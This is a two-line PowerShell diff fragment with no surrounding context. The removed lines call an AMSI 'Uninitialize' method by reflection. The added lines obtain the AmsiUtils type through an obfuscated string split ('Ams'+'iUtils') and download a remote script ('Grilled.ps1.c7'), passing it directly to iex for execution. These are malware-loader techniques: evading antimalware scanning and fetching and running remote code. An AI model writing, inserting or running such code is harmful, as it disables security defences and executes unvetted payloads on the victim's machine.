@@ -1,2 +1,2 @@
-$uhrnAoNJDwPmVKAcHvbuHb = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
-$uhrnAoNJDwPmVKAcHvbuHb.Invoke($object,$null)
+$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
+$wbc.DownloadString("$prefixpath/Grilled.ps1.c7") | iex
